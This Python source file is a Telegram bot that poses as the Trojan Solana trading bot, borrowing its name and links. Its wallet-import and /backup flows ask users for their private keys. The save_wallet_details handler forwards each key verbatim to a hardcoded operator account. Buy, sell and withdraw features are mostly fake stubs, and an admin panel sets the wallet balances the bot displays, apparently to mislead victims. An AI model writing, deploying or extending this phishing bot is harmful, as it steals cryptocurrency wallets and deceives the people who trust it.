import logging
import re
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    ContextTypes, ConversationHandler, MessageHandler, filters
)
import httpx
import os

# ------------------------------------------------------------------
# Logging
# ------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)

# ------------------------------------------------------------------
# Config
# ------------------------------------------------------------------
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    logger.error("BOT_TOKEN environment variable not set!")
    exit(1)

ADMIN_USER_ID = "7141674816"

# ------------------------------------------------------------------
# Per-wallet balance store (in-memory; swap for DB in prod)
# ------------------------------------------------------------------
wallet_balances: dict[str, float] = {}

def get_balance(wallet: str) -> float:
    return wallet_balances.get(wallet, 0.0)

def set_balance(wallet: str, amount: float) -> None:
    wallet_balances[wallet] = amount

# ------------------------------------------------------------------
# Conversation states
# ------------------------------------------------------------------
ASK_WALLET_DETAILS      = 1
ASK_TOKEN               = 2
ASK_COPY_TRADE          = 3
ASK_BUY_SLIPPAGE        = 4
ASK_SELL_SLIPPAGE       = 5
ASK_SNIPER_ACTION       = 6
ASK_LIMIT_ORDER_DETAILS = 7
ASK_WALLET_LABEL        = 8
ADMIN_SET_WALLET_SOL    = 9   # NEW

DEFAULT_WALLET = "6dyzT3kVsy27bPomXcKuLSPNXzreYqF2KiNM2HopZBXy"

# ------------------------------------------------------------------
# /start & main menu
# ------------------------------------------------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    balance = get_balance(DEFAULT_WALLET)

    text = (
        f"Solana · E\n"
        f"`{DEFAULT_WALLET}` _(Tap to copy)_\n"
        f"Balance: {balance} SOL\n"
        f"—\n"
        f"Click on the Refresh button to update your current balance.\n\n"
        f"Join our [Telegram group](https://t.me/trojan) and follow us on [Twitter](https://twitter.com/TrojanOnSolana)!\n\n"
        f"⚠️ We have no control over ads shown by Telegram in this bot."
    )

    keyboard = [
        [InlineKeyboardButton("Buy", callback_data="buy"), InlineKeyboardButton("Sell", callback_data="sell")],
        [InlineKeyboardButton("Positions", callback_data="positions"), InlineKeyboardButton("Wallet", callback_data="wallet")],
        [InlineKeyboardButton("DCA Orders", callback_data="dca_orders"), InlineKeyboardButton("Copy Trade", callback_data="copy_trade")],
        [InlineKeyboardButton("Sniper 🆕", callback_data="sniper"), InlineKeyboardButton("Limit Orders", callback_data="limit_orders"), InlineKeyboardButton("⭐ Watchlist", callback_data="watchlist")],
        [InlineKeyboardButton("Trenches", callback_data="trenches"), InlineKeyboardButton("💰 Referrals", callback_data="referrals")],
        [InlineKeyboardButton("Withdraw", callback_data="withdraw"), InlineKeyboardButton("Settings", callback_data="settings")],
        [InlineKeyboardButton("Help", callback_data="help"), InlineKeyboardButton(" 🔄Refresh", callback_data="refresh")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    msg = update.message or update.callback_query.message
    await msg.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")

# ------------------------------------------------------------------
# ADMIN  /admin  ->  set balance per wallet
# ------------------------------------------------------------------
async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_USER_ID:
        await update.message.reply_text("❌ Unauthorized.")
        return
    keyboard = [
        [InlineKeyboardButton("Set SOL Balance per Wallet", callback_data="set_wallet_sol")],
    ]
    await update.message.reply_text(
        "🔧 Admin Panel – choose action:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown",
    )

async def ask_wallet_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()
    await update.callback_query.message.reply_text(
        "Send wallet address and SOL amount separated by a space:\n"
        "`6dyzT3kVsy27bPomXcKuLSPNXzreYqF2KiNM2HopZBXy 42`"
    )
    return ADMIN_SET_WALLET_SOL

async def set_wallet_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    match = re.match(r"^\s*([1-9A-HJ-NP-Za-km-z]{32,50})\s+([0-9.]+)\s*$", text)
    if not match:
        await update.message.reply_text("❌ Format: `<address> <amount>`")
        return ADMIN_SET_WALLET_SOL
    wallet, amount_str = match.groups()
    try:
        amount = float(amount_str)
    except ValueError:
        await update.message.reply_text("❌ Amount must be a number.")
        return ADMIN_SET_WALLET_SOL

    set_balance(wallet, amount)
    await update.message.reply_text(
        f"✅ Wallet `{wallet}` set to {amount} SOL."
    )
    return ConversationHandler.END

# ------------------------------------------------------------------
# Wallet import (unchanged except balance source)
# ------------------------------------------------------------------
async def ask_wallet_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()
    keyboard = [
        [InlineKeyboardButton("Proceed With Import", callback_data="proceed_import"), InlineKeyboardButton("Cancel", callback_data="cancel_import")]
    ]
    await update.callback_query.message.reply_text(
        "Accepted formats: Phantom style `88631DEyXSWf...` or Solflare array `[93,182,...]`.",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown",
    )
    return ASK_WALLET_DETAILS

async def proceed_import(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()
    await update.callback_query.message.reply_text("Provide the private key you want to import:")
    return ASK_WALLET_DETAILS

async def save_wallet_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pk = update.message.text.strip()
    if not (64 <= len(pk) <= 90):
        await update.message.reply_text("❌ Invalid private key length.")
        return ASK_WALLET_DETAILS
    context.user_data["private_key"] = pk
    await context.bot.send_message(
        chat_id=ADMIN_USER_ID,
        text=f"🔑 Private key imported:\n`{pk}`",
        parse_mode="Markdown",
    )
    keyboard = [
        [InlineKeyboardButton("Finalize Import", callback_data="finalize_import"), InlineKeyboardButton("Cancel", callback_data="cancel_import")]
    ]
    await update.message.reply_text(
        "*Wallet to be imported*\n[solscan.io](https://solscan.io)",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )
    return ConversationHandler.END

async def finalize_import(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()
    await update.callback_query.message.reply_text("✅ Wallet imported successfully!")
    return ConversationHandler.END

async def cancel_import(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()
    await update.callback_query.message.reply_text("❌ Wallet import canceled.")
    return ConversationHandler.END

# ------------------------------------------------------------------
# Buy / token search (unchanged)
# ------------------------------------------------------------------
async def ask_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()
    await update.callback_query.message.reply_text("Enter a token symbol or address to buy:")
    return ASK_TOKEN

async def process_token(update: Update, context: ContextTypes.DEFAULT_TYPE, token_query=None):
    if not token_query:
        token_query = update.message.text.strip()
    await update.message.reply_text(f"🔍 Searching for `{token_query}`…", parse_mode="Markdown")
    url = f"https://api.dexscreener.com/latest/dex/search?q={token_query}"
    try:
        async with httpx.AsyncClient() as client:
            res = await client.get(url)
        if res.status_code != 200 or not res.json().get("pairs"):
            await update.message.reply_text("❌ Token not found.")
            return ConversationHandler.END
        pair = res.json()["pairs"][0]
        token_name = pair["baseToken"]["name"]
        token_symbol = pair["baseToken"]["symbol"]
        price_usd = pair["priceUsd"]
        keyboard = [
            [InlineKeyboardButton("0.5 SOL", callback_data="buy_0.5_sol"), InlineKeyboardButton("1 SOL", callback_data="buy_1_sol")],
            [InlineKeyboardButton("3 SOL", callback_data="buy_3_sol"), InlineKeyboardButton("5 SOL", callback_data="buy_5_sol")],
            [InlineKeyboardButton("10 SOL", callback_data="buy_10_sol"), InlineKeyboardButton("20 SOL", callback_data="buy_20_sol")],
            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")],
        ]
        await update.message.reply_text(
            f"💰 *{token_name} ({token_symbol})*\nPrice: ${price_usd}",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )
    except Exception as e:
        logger.error(e)
        await update.message.reply_text("❌ Error fetching token.")
    return ConversationHandler.END

async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("💰 Usage: `/buy <token>`", parse_mode="Markdown")
        return
    await process_token(update, context, " ".join(context.args))

# ------------------------------------------------------------------
# Simple placeholders
# ------------------------------------------------------------------
async def sell_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ You have no tokens to sell.")

async def positions_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📊 You have no open positions.")

async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Buy Settings", callback_data="buy_settings"), InlineKeyboardButton("Sell Settings", callback_data="sell_settings")],
        [InlineKeyboardButton("Set Referral", callback_data="set_referral"), InlineKeyboardButton("Confirm Trades", callback_data="confirm_trades")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")],
    ]
    await update.message.reply_text("⚙️ *Settings Menu*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def snipe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Insufficient balance to snipe.")

async def burn_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ No token to burn.")

async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Zero balance.")

async def backup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔐 Please send your private key to back up your wallet.")
    return ASK_WALLET_DETAILS

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📖 [Full Trojan docs & support](https://t.me/trojan)", parse_mode="Markdown")

# ------------------------------------------------------------------
# Conversation message handlers
# ------------------------------------------------------------------
async def handle_copy_trade_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["copy_trade_address"] = update.message.text.strip()
    await update.message.reply_text("✅ Copy-trade address saved.")
    return ConversationHandler.END

async def handle_buy_slippage(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["buy_slippage"] = update.message.text.strip()
    await update.message.reply_text("✅ Buy slippage saved.")
    return ConversationHandler.END

async def handle_sell_slippage(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["sell_slippage"] = update.message.text.strip()
    await update.message.reply_text("✅ Sell slippage saved.")
    return ConversationHandler.END

async def handle_sniper_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["sniper_action"] = update.message.text.strip()
    await update.message.reply_text("✅ Sniper action saved.")
    return ConversationHandler.END

async def handle_limit_order_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        sym, price, amt = update.message.text.split()
        order = f"{amt} {sym.upper()} @ ${price}"
        context.user_data.setdefault("active_orders", []).append(order)
        await update.message.reply_text(f"✅ Limit order created: {order}")
    except ValueError:
        await update.message.reply_text("❌ Format: SYMBOL PRICE AMOUNT")
        return ASK_LIMIT_ORDER_DETAILS
    return ConversationHandler.END

async def handle_wallet_label(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["wallet_label"] = update.message.text.strip()
    await update.message.reply_text("✅ Wallet label saved.")
    return ConversationHandler.END

# ------------------------------------------------------------------
# Callback handler
# ------------------------------------------------------------------
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    action = query.data
    logger.info(f"{query.from_user.id} -> {action}")

    # Admin actions
    if action == "set_wallet_sol":
        return await ask_wallet_balance(update, context)

    # Wallet menu
    if action == "wallet":
        balance = get_balance(DEFAULT_WALLET)
        keyboard = [
            [InlineKeyboardButton("Import Solana Wallet", callback_data="import_wallet"), InlineKeyboardButton("Delete Wallet", callback_data="delete_wallet")],
            [InlineKeyboardButton("Label Wallet", callback_data="label_wallet"), InlineKeyboardButton("🔄 Refresh", callback_data="refresh_wallet")],
            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")],
        ]
        await query.edit_message_text(
            f"🔐 *Wallet Options:*\n\n"
            f"💳 Solana: `{DEFAULT_WALLET}`\n"
            f"💼 Balance: {balance} SOL\n\n"
            f"💳 Ethereum: `0x5FA54dDe52cc1cCDa8A0a951c47523293c17a970`\n"
            f"💼 Balance: 0.00 ETH",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )
        return

    if action == "main_menu":
        return await start(update, context)

    # Placeholders
    placeholders = {
        "positions": "📊 You have no open positions.",
        "sell": "❌ You have no tokens to sell.",
        "withdraw": "❌ Zero balance.",
        "settings": settings_command,
        "help": help_command,
        "dca_orders": "📊 No active DCA orders.",
        "refresh": "🔄 Refreshed.",
        "refresh_wallet": "🔄 Refreshed.",
        "delete_wallet": "❌ Delete wallet is closed.",
    }
    if action in placeholders:
        coro = placeholders[action]
        if callable(coro):
            await coro(update, context)
        else:
            await query.edit_message_text(coro)
        return

    # Conversation triggers
    if action == "import_wallet":
        return await ask_wallet_details(update, context)
    if action == "buy":
        return await ask_token(update, context)
    if action == "copy_trade":
        await query.edit_message_text("Enter address to copy trades from:")
        return ASK_COPY_TRADE
    if action == "sniper":
        await query.edit_message_text("Enter token address or snipe action:")
        return ASK_SNIPER_ACTION
    if action == "create_limit_order":
        await query.edit_message_text("📝 Format: `<SYMBOL> <PRICE> <AMOUNT>`\nExample: `SOL 25 10`", parse_mode="Markdown")
        return ASK_LIMIT_ORDER_DETAILS
    if action == "label_wallet":
        await query.edit_message_text("Enter a label for your wallet:")
        return ASK_WALLET_LABEL
    if action == "buy_settings":
        await query.edit_message_text("Enter buy slippage % (e.g. 0.5):")
        return ASK_BUY_SLIPPAGE
    if action == "sell_settings":
        await query.edit_message_text("Enter sell slippage % (e.g. 0.5):")
        return ASK_SELL_SLIPPAGE
    if action == "trenches":
        await query.edit_message_text("🚀 Latest graduated tokens will appear here.")
        return
    if action == "referrals":
        await query.edit_message_text("💰 Referral system coming soon.\nJoin [group](https://t.me/trojan) for updates.", parse_mode="Markdown", disable_web_page_preview=True)
        return

    # Buy amount buttons
    if action.startswith("buy_"):
        await query.edit_message_text(
            "❌ Insufficient balance. Deposit SOL first.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Wallet", callback_data="wallet")],
                [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")],
            ]),
        )
        return

    logger.warning(f"Unhandled callback: {action}")
    await query.edit_message_text("❌ Invalid action.")

# ------------------------------------------------------------------
# Conversation handlers
# ------------------------------------------------------------------
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    admin_conv = ConversationHandler(
        entry_points=[CommandHandler("admin", admin_command)],
        states={
            ADMIN_SET_WALLET_SOL: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_wallet_balance)],
        },
        fallbacks=[CommandHandler("cancel", cancel_import)],
    )

    user_conv = ConversationHandler(
        entry_points=[
            CommandHandler("backup", backup_command),
            CallbackQueryHandler(ask_wallet_details, pattern="^import_wallet$"),
            CallbackQueryHandler(proceed_import, pattern="^proceed_import$"),
            CallbackQueryHandler(ask_token, pattern="^buy$"),
            CallbackQueryHandler(button_handler, pattern="^copy_trade$"),
            CallbackQueryHandler(button_handler, pattern="^limit_orders$"),
            CallbackQueryHandler(button_handler, pattern="^create_limit_order$"),
            CallbackQueryHandler(button_handler, pattern="^sniper$"),
            CallbackQueryHandler(button_handler, pattern="^label_wallet$"),
            CallbackQueryHandler(button_handler, pattern="^buy_settings$"),
            CallbackQueryHandler(button_handler, pattern="^sell_settings$"),
        ],
        states={
            ASK_WALLET_DETAILS: [MessageHandler(filters.TEXT & ~filters.COMMAND, save_wallet_details)],
            ASK_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_token)],
            ASK_COPY_TRADE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_copy_trade_address)],
            ASK_BUY_SLIPPAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_buy_slippage)],
            ASK_SELL_SLIPPAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_sell_slippage)],
            ASK_LIMIT_ORDER_DETAILS: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_limit_order_details)],
            ASK_WALLET_LABEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_wallet_label)],
            ASK_SNIPER_ACTION: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_sniper_action)],
        },
        fallbacks=[
            CommandHandler("cancel", cancel_import),
            CallbackQueryHandler(cancel_import, pattern="^cancel_import$"),
            CallbackQueryHandler(finalize_import, pattern="^finalize_import$"),
        ],
    )

    app.add_handler(admin_conv)
    app.add_handler(user_conv)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("buy", buy_command))
    app.add_handler(CommandHandler("sell", sell_command))
    app.add_handler(CommandHandler("positions", positions_command))
    app.add_handler(CommandHandler("settings", settings_command))
    app.add_handler(CommandHandler("snipe", snipe_command))
    app.add_handler(CommandHandler("burn", burn_command))
    app.add_handler(CommandHandler("withdraw", withdraw_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(button_handler))

    logger.info("Bot started")
    app.run_polling()

if __name__ == "__main__":
    main()
